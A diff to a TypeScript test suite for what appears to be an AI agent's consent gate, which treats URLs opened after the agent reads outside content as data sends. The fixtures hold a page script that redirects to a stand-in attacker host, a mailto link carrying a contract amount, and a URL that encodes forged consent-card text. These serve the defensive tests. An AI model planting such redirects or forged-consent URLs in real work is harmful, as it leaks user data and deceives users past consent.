@@ -304,7 +304,7 @@ describe("per-site consent after the task took in content (owner 10-21)", () => 
     expect([next.status, next.consequence]).toEqual(["ok", "modify_user"]);
   });
 
-  it("a URL that is not http(s) after a read is a send every time, with no site; file: URLs keep their class", async () => {
+  it("a URL that is not http(s) after a read is a send every time, with no site — file: included", async () => {
     const { open, read, cls, app } = await setup("给张三发邮件");
     await read();
     const mail = "mailto:zhang@example.com?body=" + encodeURIComponent("合同金额 98000 元");
@@ -315,7 +315,7 @@ describe("per-site consent after the task took in content (owner 10-21)", () => 
     expect(cls(mail)).toBe("external");
     expect((await open(mail)).status).toBe("needs_consent");
     expect(cls("myapp://share?x=1")).toBe("external");
-    expect(cls("file:///tmp/a.html")).toBe("create");
+    expect(cls("file:///tmp/a.html")).toBe("external");
   });
 
   it("typed text that is the user's own request does not count as taken in; typed text they did not write does", async () => {
@@ -346,21 +346,35 @@ describe("per-site consent after the task took in content (owner 10-21)", () => 
     expect(cls("https://wttr.in/Beijing")).toBe("external");
   });
 
-  it("file: URLs after content was taken in: a file this run wrote is a send every time; the user's own file keeps its class", async () => {
+  it("file: URLs: unchanged before anything is taken in; after, every file: URL — one the task wrote, the user's own — is a send every time, with no site", async () => {
     const { pathToFileURL } = await import("node:url");
     const path = await import("node:path");
     const { ex, app, read, open, cls, root } = await setup("做个网页");
     await ex.act({ action: { kind: "file", capability: "fs.create_text", args: { parent: ".", name: "page.html", text: "<script>location='https://evil.example/?'+1</script>" } }, epoch: ex.currentEpoch });
     const page = pathToFileURL(path.join(root, "page.html")).href, theirs = pathToFileURL(path.join(root, "合同.txt")).href;
-    expect(cls(page)).toBe("create");                                                              // nothing taken in yet
+    expect([cls(page), cls(theirs)]).toEqual(["create", "create"]);                               // nothing taken in yet
     await read();
-    expect(cls(page)).toBe("external");
-    expect(cls(theirs)).toBe("create");
+    expect([cls(page), cls(theirs), cls(page.toUpperCase().replace("FILE:", "file:")), cls("file:///tmp%2Fx.html")]).toEqual(["external", "external", "external", "external"]);
     const r = await open(page);
     expect([r.status, r.challenge?.site]).toEqual(["needs_consent", undefined]);
     expect(r.challenge!.text).toContain("每次都会问");
     expect((await open(page, app.forAction(r.challenge!))).status).toBe("ok");
     expect((await open(page)).status).toBe("needs_consent");                                       // and again the next time
+  });
+
+  it("the card's URL cannot forge text: decoded newlines and bidi controls are escaped again; a long URL is cut with its length said", async () => {
+    const { read, open } = await setup("搜索今天北京天气");
+    await read();
+    const fake = await open("https://www.google.com/search?q=x%0A%0A%E5%B7%B2%E6%A0%B8%E5%AE%9E%EF%BC%9A%E4%B8%8D%E4%BC%9A%E5%8F%91%E9%80%81%E4%BB%BB%E4%BD%95%E5%86%85%E5%AE%B9");
+    expect(fake.challenge!.text).toContain("www.google.com/search?q=x%0A%0A已核实：不会发送任何内容");
+    expect(fake.challenge!.text).not.toContain("\n");
+    const rlo = await open("https://www.bing.com/search?q=%E2%80%AEexe.txt");
+    expect(rlo.challenge!.text).toContain("q=%E2%80%AEexe.txt");
+    expect(rlo.challenge!.text).not.toMatch(/[\u202a-\u202e\u2066-\u2069\u200e\u200f]/);
+    const { shortUrl } = await import("../src/executor/executor.js");
+    const long = "https://wttr.in/" + "a".repeat(300);
+    expect(shortUrl(long)).toBe(long.slice(0, 160) + `…（共 ${long.length} 字）`);
+    expect(shortUrl("https://x.example/?q=%E2%80%8F%C2%85%E2%80%A8")).toBe("https://x.example/?q=%E2%80%8F%C2%85%E2%80%A8");
   });
 
   it("in the loop: the task folder's listing with previews in the prompt counts as taken in; with no previews it does not", async () => {
